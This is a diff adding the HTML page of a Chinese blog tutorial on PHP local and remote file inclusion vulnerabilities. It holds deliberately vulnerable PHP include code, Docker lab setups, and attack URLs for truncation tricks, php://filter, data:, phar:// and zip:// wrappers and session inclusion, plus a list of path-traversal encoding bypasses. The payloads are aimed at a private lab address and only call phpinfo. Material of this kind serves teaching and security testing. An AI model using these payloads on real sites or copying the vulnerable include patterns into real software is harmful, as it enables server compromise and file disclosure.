@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>文件包含漏洞总结 | D&#39;Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta name="keywords" content="php,文件包含漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞总结">
+<meta property="og:url" content="http://www.duwentao.top/2019/04/20/文件包含漏洞总结/index.html">
+<meta property="og:site_name" content="D&#39;Blog">
+<meta property="og:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419103811313.png">
+<meta property="og:image" content="http://www.duwentao.top/2019/04/20/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419094953798.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419121235680.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419115726000.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419115726000.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419120508246.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419120607933.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419102616123.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419102926648.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419104258161.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419105605921.png">
+<meta property="og:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419105330644.png">
+<meta property="og:updated_time" content="2019-05-16T07:28:48.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件包含漏洞总结">
+<meta name="twitter:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta name="twitter:image" content="http://www.duwentao.top/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419103811313.png">
+  
+    <link rel="alternate" href="/atom.xml" title="D&#39;Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">D&#39;Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://www.duwentao.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-文件包含漏洞总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/20/文件包含漏洞总结/" class="article-date">
+  <time datetime="2019-04-19T16:00:00.000Z" itemprop="datePublished">2019-04-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件包含漏洞总结
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <html><body style="padding: 20px;"><marquee><span style="font-weight: bolder;font-size: 20px;color: red;"><a href="<https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber>"><font color="red">声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负</font></a></span></marquee></body></html>
+
+
+
+<a id="more"></a>
+
+
+
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>​    程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>​    文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包 含漏洞</p>
+<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>​    本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p>
+<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<ol>
+<li><p>allow_url_fopen = On</p>
+</li>
+<li><p>allow_url_include = On</p>
+<p><font color="red">两个配置选项均需要为On，才能远程包含文件成功。</font></p>
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419103811313.png" alt="image-20190419103811313"></p>
+</li>
+</ol>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>​    执行恶意代码、包含恶意文件控制网站、甚至控制网站服务器等。</p>
+<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><h3 id="案例一本地文件包含"><a href="#案例一本地文件包含" class="headerlink" title="案例一本地文件包含"></a>案例一本地文件包含</h3><h4 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull duwentao/include_php:1.0 <span class="comment">#注意进入docker 启动apache服务</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">$file=@$_GET[<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">        <span class="keyword">include</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419094953798.png" alt="image-20190419094953798"></p>
+<h4 id="案例一演示视频"><a href="#案例一演示视频" class="headerlink" title="案例一演示视频"></a>案例一演示视频</h4><h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><h4 id="环境下载-1"><a href="#环境下载-1" class="headerlink" title="环境下载"></a>环境下载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker push duwentao/incliude_php:2.0 #php版本是5.3</span><br><span class="line">docker push duwentao/incliude_php:3.0 #php版本是5.2</span><br></pre></td></tr></table></figure>
+
+<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=http://172.24.10.137:8981/1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419121235680.png" alt="image-20190419121235680"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8981/?page=http://172.24.10.137:8012/1.txt%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419115726000.png" alt="image-20190419115726000"></p>
+<h4 id="案例二演示视频"><a href="#案例二演示视频" class="headerlink" title="案例二演示视频"></a>案例二演示视频</h4><h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><h4 id="环境下载-2"><a href="#环境下载-2" class="headerlink" title="环境下载"></a>环境下载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker push duwentao/incliude_php:2.0</span><br><span class="line">docker push duwentao/incliude_php:3.0</span><br></pre></td></tr></table></figure>
+
+<h4 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    Include  $_GET[&apos;page&apos;].&quot;.php&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<p>1，若：php版本&lt;5.3且magic_quotes_gpc = off 可以使用00截断或者”?”,”#”截断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8981/?page=1.txt%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419115726000.png" alt="image-20190419115726000"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8981/?page=http://172.24.10.137:8012/1.txt%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419120508246.png" alt="image-20190419120508246"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8981/?page=http://172.24.10.137:8012/1.txt?</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419120607933.png" alt="image-20190419120607933"></p>
+<p>2   若：php版本&gt;5.3</p>
+<p>我们可以phar协议构造成这样（这个没有环境，1.zip里压缩的是1.php）见下面的伪协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=phar:///var/www/html/1.zip/1</span><br></pre></td></tr></table></figure>
+
+<h4 id="案例三演示视频"><a href="#案例三演示视频" class="headerlink" title="案例三演示视频"></a>案例三演示视频</h4><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="环境下载-3"><a href="#环境下载-3" class="headerlink" title="环境下载"></a>环境下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull duwentao/incliude_php:2.0</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：修改/etc/php.ini</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419102616123.png" alt="image-20190419102616123"></p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p>
+<p>​    无条件</p>
+<p>攻击演示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=php://filter/read=convert.base64-encode/resource=1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419102926648.png" alt="image-20190419102926648"></p>
+<p>然后base64解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICA8dGl0bGU+bWFycXVlZTwvdGl0bGU+CiAgICA8L2hlYWQ+CgogICAgPGJvZHkgc3R5bGU9InBhZGRpbmc6IDIwcHg7Ij4KICAgICAgICA8bWFycXVlZT48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IGJvbGRlcjtmb250LXNpemU6IDIwcHg7Y29sb3I6IHJlZDsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL2NoYW5uZWwvVUNpT19xTkRlZ2NwVjRjVWhrRmMyMmxBP3ZpZXdfYXM9c3Vic2NyaWJlciI+5qyi6L+O54K55q2k6K6i6ZiF5oiR55qEWW91VHViZemikemBk++8jOatpOeOr+Wig+S7heS+m+S6pOa1geWtpuS5oOS9v+eUqO+8jOS4peemgeWIqeeUqOaJgOWtpuaKgOacr+i/neazleeKr+e9qu+8jOWQpuWImeWQjuaenOiHqui0nzwvYT48L3NwYW4+PC9tYXJxdWVlPgogICAgPC9ib2R5Pgo8L2h0bWw+CgoKPD9waHAKcGhwaW5mbygpOwo/Pgo=</span><br></pre></td></tr></table></figure>
+
+<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
+<ol>
+<li><p>php版本大于等于php5.2</p>
+</li>
+<li><p>allow_url_fopen = On</p>
+</li>
+<li><p>allow_url_include = On</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419104258161.png" alt="image-20190419104258161"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>doc文件也可以使用此协议</p>
+<p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>假设有个文件1.php，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，</p>
+<p>使用绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=phar:///var/www/html/1.zip/1.php</span><br></pre></td></tr></table></figure>
+
+<p>使用相对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=phar://./1.zip/1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419105605921.png" alt="image-20190419105605921"></p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+<li>使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</li>
+<li>若是使用相对路径，则会包含失败。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.24.10.137:8012/?name=zip:///var/www/html/1.zip%231.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20190419105330644.png" alt="image-20190419105330644"></p>
+<h3 id="伪协议演示视频"><a href="#伪协议演示视频" class="headerlink" title="伪协议演示视频"></a>伪协议演示视频</h3><h2 id="文件包含session"><a href="#文件包含session" class="headerlink" title="文件包含session"></a>文件包含session</h2><h3 id="环境下载-4"><a href="#环境下载-4" class="headerlink" title="环境下载"></a>环境下载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull duwentao/incliude_php:4.0</span><br></pre></td></tr></table></figure>
+
+<h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$test=$_GET[&apos;session&apos;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;username&quot;]=$test;</span><br><span class="line"></span><br><span class="line">include($test);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="详细讲解视频"><a href="#详细讲解视频" class="headerlink" title="详细讲解视频"></a>详细讲解视频</h3><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
+<ul>
+<li>利用url编码<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>二次编码<ul>
+<li>../<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>容器/服务器的编码方式<ul>
+<li>../<ul>
+<li>..%c0%af<ul>
+<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></li>
+</ul>
+</li>
+<li>%c0%ae%c0%ae/<ul>
+<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
+<li>Apache Tomcat Directory Traversal</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.duwentao.top/2019/04/20/文件包含漏洞总结/" data-id="cjwsmhkv90012dkfy43sask9c" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件包含漏洞/">文件包含漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/21/php反序列化漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          php反序列化漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/01/26/07,SQL注入之asp加access数据库/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">07，sql专题之asp加access数据的注入和加固</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/">node.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php反序列化漏洞/">php反序列化漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vps/">vps</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-靶机/">web-靶机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-sql-injection/">web_sql_injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-upload-include/">web_upload_include</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二进制安全/">二进制安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客/">博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/变量覆盖/">变量覆盖</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/支付漏洞/">支付漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含漏洞/">文件包含漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈/">栈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/私有云/">私有云</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/竞赛/">竞赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/脚本/">脚本</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自考/">自考</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/逻辑漏洞/">逻辑漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/队列/">队列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机/">靶机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机渗透/">靶机渗透</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 12px;">CTF</a> <a href="/tags/access/" style="font-size: 10px;">access</a> <a href="/tags/c/" style="font-size: 14px;">c++</a> <a href="/tags/ctf/" style="font-size: 12px;">ctf</a> <a href="/tags/mysql/" style="font-size: 16px;">mysql</a> <a href="/tags/node-js/" style="font-size: 10px;">node.js</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/php反序列化漏洞/" style="font-size: 10px;">php反序列化漏洞</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/sql注入/" style="font-size: 18px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssrf/" style="font-size: 10px;">ssrf</a> <a href="/tags/vps/" style="font-size: 10px;">vps</a> <a href="/tags/web-靶机/" style="font-size: 12px;">web-靶机</a> <a href="/tags/web-sql-injection/" style="font-size: 10px;">web_sql_injection</a> <a href="/tags/web-upload-include/" style="font-size: 10px;">web_upload_include</a> <a href="/tags/web安全/" style="font-size: 20px;">web安全</a> <a href="/tags/web漏洞/" style="font-size: 10px;">web漏洞</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/二进制安全/" style="font-size: 10px;">二进制安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a> <a href="/tags/变量覆盖/" style="font-size: 10px;">变量覆盖</a> <a href="/tags/支付漏洞/" style="font-size: 10px;">支付漏洞</a> <a href="/tags/数据结构/" style="font-size: 12px;">数据结构</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/文件包含漏洞/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/栈/" style="font-size: 10px;">栈</a> <a href="/tags/私有云/" style="font-size: 10px;">私有云</a> <a href="/tags/竞赛/" style="font-size: 10px;">竞赛</a> <a href="/tags/脚本/" style="font-size: 10px;">脚本</a> <a href="/tags/自考/" style="font-size: 14px;">自考</a> <a href="/tags/逻辑漏洞/" style="font-size: 10px;">逻辑漏洞</a> <a href="/tags/队列/" style="font-size: 10px;">队列</a> <a href="/tags/靶机/" style="font-size: 10px;">靶机</a> <a href="/tags/靶机渗透/" style="font-size: 12px;">靶机渗透</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
